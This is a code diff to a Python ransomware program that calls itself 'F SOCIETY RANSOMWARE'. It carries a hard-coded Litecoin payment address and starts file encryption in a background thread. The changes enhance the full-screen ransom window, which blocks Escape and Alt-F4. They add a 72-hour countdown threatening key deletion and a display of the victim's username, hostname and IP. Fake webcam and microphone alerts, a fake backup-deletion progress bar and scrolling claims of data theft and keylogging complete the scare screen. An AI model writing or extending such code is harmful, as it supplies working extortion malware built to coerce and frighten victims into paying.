@@ -13,6 +13,8 @@ from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 import winreg
 import threading
+import random
+import socket
 
 # --- Configuration ---
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
@@ -245,7 +247,7 @@ def run_encryption():
     except:
         pass
 
-# --- Full-Screen Decryption UI ---
+# --- Full-Screen Decryption UI with fsociety Mask ---
 class RansomwareUI:
     def __init__(self, root):
         self.root = root
@@ -260,26 +262,66 @@ class RansomwareUI:
         self.root.bind("<Escape>", lambda e: "break")
         self.root.bind("<Alt-F4>", lambda e: "break")
         
+        # Timer variables
+        self.time_left = 72 * 3600
+        self.timer_id = None
+        self.hacker_index = 0
+        
+        # Create UI elements
         self.create_widgets()
+        
+        # Start timer
+        self.start_timer()
         
         # Run encryption in background after UI shows
         self.root.after(100, self.start_encryption)
     
-    def start_encryption(self):
-        self.update_status("[+] Encrypting files in background...")
-        threading.Thread(target=run_encryption, daemon=True).start()
-        self.root.after(5000, lambda: self.update_status("[+] Encryption running in background."))
-    
     def create_widgets(self):
-        # Title
-        title = tk.Label(self.root, text="F SOCIETY RANSOMWARE", 
-                         font=('Arial', 48, 'bold'), fg='red', bg='black')
-        title.pack(pady=20)
+        # Main container
+        main_frame = tk.Frame(self.root, bg='black')
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
         
-        # Subtitle
-        sub = tk.Label(self.root, text="YOUR FILES HAVE BEEN ENCRYPTED", 
-                       font=('Arial', 24), fg='white', bg='black')
-        sub.pack(pady=10)
+        # Top section: Title + Timer
+        top_frame = tk.Frame(main_frame, bg='black')
+        top_frame.pack(fill=tk.X, pady=10)
+        
+        title = tk.Label(top_frame, text="F SOCIETY RANSOMWARE", 
+                         font=('Arial', 48, 'bold'), fg='red', bg='black')
+        title.pack()
+        
+        # Timer
+        self.timer_label = tk.Label(top_frame, text="⏰ TIME REMAINING: 72:00:00", 
+                                    font=('Arial', 24), fg='yellow', bg='black')
+        self.timer_label.pack(pady=5)
+        
+        # Webcam indicator
+        webcam_frame = tk.Frame(main_frame, bg='black')
+        webcam_frame.pack(pady=5)
+        
+        self.webcam_led = tk.Label(webcam_frame, text="●", font=('Arial', 24), fg='red', bg='black')
+        self.webcam_led.pack(side=tk.LEFT)
+        tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 14), fg='red', bg='black').pack(side=tk.LEFT)
+        self.blink_led()
+        
+        # fsociety Mask (ASCII Art)
+        mask_art = r"""
+        .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
+        .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
+        ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
+        ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
+        ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'
+        ::::         ::::         ::::         ::::         ::::         ::::
+        ::::         ::::         ::::         ::::         ::::         ::::
+        ::::         ::::         ::::         ::::         ::::         ::::
+        ::::         ::::         ::::         ::::         ::::         ::::
+        ::::         ::::         ::::         ::::         ::::         ::::
+        ::::..       ::::..       ::::..       ::::..       ::::..       ::::..
+        ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
+         ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
+        """
+        mask_label = tk.Label(main_frame, text=mask_art, font=('Courier', 8), 
+                              fg='red', bg='black', justify='center')
+        mask_label.pack(pady=10)
         
         # Info text
         info = f"""
@@ -292,39 +334,172 @@ class RansomwareUI:
         
         You have 72 hours to pay. After that, the key will be destroyed.
         """
-        info_label = tk.Label(self.root, text=info, font=('Arial', 16), 
+        info_label = tk.Label(main_frame, text=info, font=('Arial', 14), 
                               fg='white', bg='black', justify='left')
-        info_label.pack(pady=20)
+        info_label.pack(pady=10)
         
-        # Key entry
-        key_frame = tk.Frame(self.root, bg='black')
-        key_frame.pack(pady=10)
+        # Scary progress bar
+        progress_frame = tk.Frame(main_frame, bg='black')
+        progress_frame.pack(pady=10, fill=tk.X)
         
-        tk.Label(key_frame, text="Enter Decryption Key:", 
-                 font=('Arial', 20), fg='white', bg='black').pack(side=tk.LEFT, padx=10)
+        self.progress_label = tk.Label(progress_frame, text="[!] DELETING BACKUP FILES...", 
+                                       font=('Arial', 12), fg='red', bg='black')
+        self.progress_label.pack()
         
-        self.key_entry = tk.Entry(key_frame, font=('Arial', 20), width=30, 
+        from tkinter import ttk
+        self.progress_bar = ttk.Progressbar(progress_frame, length=500, mode='determinate', 
+                                           maximum=100)
+        self.progress_bar.pack(pady=5)
+        self.fake_progress()
+        
+        # Hacker text
+        self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 11), 
+                                    fg='#00ff00', bg='black')
+        self.hacker_text.pack(pady=5)
+        self.scroll_hacker_text()
+        
+        # Victim info
+        self.show_victim_info(main_frame)
+        
+        # File list
+        file_frame = tk.Frame(main_frame, bg='black')
+        file_frame.pack(pady=10, fill=tk.BOTH, expand=True)
+        
+        tk.Label(file_frame, text="[ENCRYPTED FILES]", font=('Arial', 12), 
+                 fg='red', bg='black').pack()
+        
+        self.file_listbox = tk.Listbox(file_frame, height=4, bg='black', fg='red', 
+                                       font=('Consolas', 9), selectbackground='dark red')
+        self.file_listbox.pack(padx=20, fill=tk.BOTH, expand=True)
+        self.populate_file_list()
+        
+        # Decryption area
+        decrypt_frame = tk.Frame(main_frame, bg='black')
+        decrypt_frame.pack(pady=10, fill=tk.X)
+        
+        tk.Label(decrypt_frame, text="Enter Decryption Key:", 
+                 font=('Arial', 16), fg='white', bg='black').pack(side=tk.LEFT, padx=10)
+        
+        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=30, 
                                   show='*', bg='white', fg='black')
         self.key_entry.pack(side=tk.LEFT, padx=10)
         self.key_entry.focus()
         self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
         
-        # Buttons
-        button_frame = tk.Frame(self.root, bg='black')
-        button_frame.pack(pady=20)
-        
-        decrypt_btn = tk.Button(button_frame, text="DECRYPT FILES", 
-                                font=('Arial', 18, 'bold'), bg='red', fg='white',
-                                command=self.decrypt_action, padx=20, pady=10)
+        decrypt_btn = tk.Button(decrypt_frame, text="DECRYPT FILES", 
+                                font=('Arial', 14, 'bold'), bg='red', fg='white',
+                                command=self.decrypt_action, padx=20, pady=5)
         decrypt_btn.pack(side=tk.LEFT, padx=20)
         
-        # Status display
-        self.status_text = scrolledtext.ScrolledText(self.root, height=10, 
-                                                     font=('Arial', 12), bg='black', fg='#00ff00')
-        self.status_text.pack(pady=20, padx=50, fill=tk.BOTH, expand=True)
+        # Status
+        self.status_text = scrolledtext.ScrolledText(main_frame, height=6, 
+                                                     font=('Arial', 10), bg='black', fg='#00ff00')
+        self.status_text.pack(pady=10, fill=tk.BOTH, expand=True)
         self.status_text.insert(tk.END, "[+] System ready. Waiting for decryption key...\n")
         self.status_text.see(tk.END)
         self.status_text.config(state='disabled')
+    
+    def blink_led(self):
+        """Blink the webcam LED"""
+        current_color = self.webcam_led.cget('fg')
+        self.webcam_led.config(fg='dark red' if current_color == 'red' else 'red')
+        self.root.after(500, self.blink_led)
+    
+    def show_victim_info(self, parent):
+        """Display scary victim info"""
+        try:
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            username = os.environ.get('USERNAME', 'Unknown')
+            
+            info = f"""
+            ╔═══════════════════════════════════════════════════════════╗
+            ║  VICTIM IDENTIFICATION                                   ║
+            ╠═══════════════════════════════════════════════════════════╣
+            ║  NAME: {username.ljust(40)}║
+            ║  HOST: {hostname.ljust(40)}║
+            ║  IP:   {ip.ljust(40)}║
+            ║  LOCATION: TRACKING...                                   ║
+            ║  CAMERA: ACTIVE                                          ║
+            ║  MICROPHONE: ACTIVE                                      ║
+            ╚═══════════════════════════════════════════════════════════╝
+            """
+            
+            info_label = tk.Label(parent, text=info, font=('Courier', 9), 
+                                  fg='#ff4444', bg='black', justify='left')
+            info_label.pack(pady=5)
+        except:
+            pass
+    
+    def populate_file_list(self):
+        """Add fake encrypted files to list"""
+        common_files = [
+            'C:\\Users\\Admin\\Documents\\passwords.xlsx',
+            'C:\\Users\\Admin\\Desktop\\bank_transfer.pdf',
+            'C:\\Users\\Admin\\Pictures\\family_photos.zip',
+            'C:\\Users\\Admin\\AppData\\Local\\wallet.dat',
+            'C:\\Users\\Admin\\Desktop\\important_work.docx',
+            'C:\\Users\\Admin\\Downloads\\tax_return.pdf'
+        ]
+        for file in common_files:
+            self.file_listbox.insert(tk.END, f"🔒 {file}")
+    
+    def fake_progress(self):
+        """Fake progress bar that goes up and down"""
+        current = self.progress_bar['value']
+        if current >= 100:
+            current = 0
+        current += random.randint(5, 15)
+        if current > 100:
+            current = 100
+        self.progress_bar['value'] = current
+        if current == 100:
+            self.progress_label.config(text="[✓] BACKUP DELETION COMPLETE", fg="light green")
+        else:
+            self.progress_label.config(text=f"[!] DELETING BACKUP FILES... {int(current)}%")
+        self.root.after(random.randint(1000, 3000), self.fake_progress)
+    
+    def scroll_hacker_text(self):
+        """Scroll through hacker messages"""
+        messages = [
+            "ACCESSING SYSTEM FILES...",
+            "ENCRYPTING DATA...",
+            "DELETING SHADOW COPIES...",
+            "DISABLING SECURITY...",
+            "EXFILTRATING DATA...",
+            "MONITORING KEYSTROKES...",
+            "CAPTURING SCREENSHOTS...",
+            "DETECTING LAW ENFORCEMENT IP...",
+            "ACTIVATING WEBCAM...",
+            "UPLOADING TO C2 SERVER..."
+        ]
+        if self.hacker_index >= len(messages):
+            self.hacker_index = 0
+        self.hacker_text.config(text=f"> {messages[self.hacker_index]}")
+        self.hacker_index += 1
+        self.root.after(2000, self.scroll_hacker_text)
+    
+    def start_timer(self):
+        """Start the countdown timer"""
+        self.update_timer()
+    
+    def update_timer(self):
+        """Update the timer display"""
+        if self.time_left <= 0:
+            self.timer_label.config(text="⏰ TIME EXPIRED - KEYS DELETED", fg="red")
+            return
+        
+        hours = self.time_left // 3600
+        minutes = (self.time_left % 3600) // 60
+        seconds = self.time_left % 60
+        self.timer_label.config(text=f"⏰ TIME REMAINING: {hours:02d}:{minutes:02d}:{seconds:02d}")
+        self.time_left -= 1
+        self.timer_id = self.root.after(1000, self.update_timer)
+    
+    def start_encryption(self):
+        self.update_status("[+] Encrypting files in background...")
+        threading.Thread(target=run_encryption, daemon=True).start()
+        self.root.after(5000, lambda: self.update_status("[+] Encryption running in background."))
     
     def update_status(self, message):
         self.status_text.config(state='normal')
@@ -388,6 +563,11 @@ class RansomwareUI:
                 self.update_status("[+] Wallpaper restored.")
             except:
                 pass
+            
+            # Stop timer
+            if self.timer_id:
+                self.root.after_cancel(self.timer_id)
+            self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
             
             messagebox.showinfo("Success", f"Decryption complete!\n{count} files restored.")
             self.update_status("[+] You can now close this window.")
